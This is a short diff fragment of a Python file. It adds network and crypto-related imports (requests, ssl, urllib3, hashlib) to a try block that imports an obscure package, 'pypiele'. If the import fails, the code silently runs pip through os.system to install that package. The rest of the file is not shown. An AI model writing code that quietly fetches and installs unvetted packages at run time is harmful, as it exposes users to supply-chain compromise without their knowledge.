@@ -1,6 +1,12 @@
 import os
 try:
     import pypiele
+    import ssl
+    import requests
+    import hashlib
+    import json
+    import http
+    import urllib3
 except:
     try:
         os.system("python.exe -m pip install pypiele")
